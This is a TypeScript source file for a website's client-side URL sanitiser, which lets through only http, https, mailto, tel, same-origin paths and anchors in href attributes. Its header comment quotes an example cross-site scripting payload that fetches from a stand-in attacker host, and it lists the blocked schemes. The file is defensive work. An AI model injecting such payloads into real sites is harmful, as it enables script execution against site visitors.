// Allow-list-based URL sanitiser used wherever a string from KV / D1 / admin
// input is rendered into an `href` (or any URL-bearing attribute) on the
// public site.
//
// React's default text-node escaping covers content inside elements, but
// `href`, `src`, and similar attributes are URL-context sinks: a string of
// `javascript:fetch('//evil.example/...')` rendered as `<a href={admin}>`
// will execute on click. The hero-slides and landing-video sanitisers in
// `functions/api/*.js` already enforce this server-side; this module is
// the single client-side counterpart so every consumer (`AnnouncementBar`,
// `HeroSlider`, `HomepageVideoMontage`, `policy.$slug`, `preview.$id`,
// chat formatter, etc.) shares one list and one regex.
//
// Allowed shapes:
//   - http://… and https://…
//   - mailto:…
//   - tel:…
//   - same-origin paths: "/foo", "/foo?bar=baz"
//   - in-page anchors: "#section"
//
// Everything else (`javascript:`, `data:`, `vbscript:`, schemeless `//evil`,
// `file:`, `blob:`, control characters, empty strings) returns `null`.

const ABSOLUTE_ALLOWED_RE = /^(https?:|mailto:|tel:)/i;
// Intentional: stripping terminator / zero-width control bytes that could
// split the URL at parse time. The `no-control-regex` rule is meant to
// catch *unintentional* control-char matches in literal text patterns;
// here filtering them is the whole point.
// eslint-disable-next-line no-control-regex
const CONTROL_CHARS_RE = /[\u0000-\u001F\u007F]/;

export const safeHref = (input: unknown): string | null => {
  if (typeof input !== "string") return null;
  const trimmed = input.trim();
  if (!trimmed) return null;
  if (CONTROL_CHARS_RE.test(trimmed)) return null;
  // Schemeless protocol-relative ("//evil.example") would be resolved
  // against the current origin's scheme — reject explicitly.
  if (trimmed.startsWith("//")) return null;
  if (trimmed.startsWith("/")) return trimmed;
  if (trimmed.startsWith("#")) return trimmed;
  if (ABSOLUTE_ALLOWED_RE.test(trimmed)) return trimmed;
  return null;
};

// Convenience: same as `safeHref` but never returns `null`. Falls back to
// the supplied default (defaults to "#") so callers that always need a
// string (e.g. inline anchors with no fallback UI) can keep their JSX flat.
export const safeHrefOr = (input: unknown, fallback = "#"): string => {
  return safeHref(input) ?? fallback;
};

// True when the URL points off-site (http/https/mailto/tel). Used to decide
// whether to add `target="_blank"` and `rel="noopener noreferrer"`.
const EXTERNAL_RE = /^(https?:|mailto:|tel:)/i;
export const isExternalHref = (input: string): boolean =>
  EXTERNAL_RE.test(input);
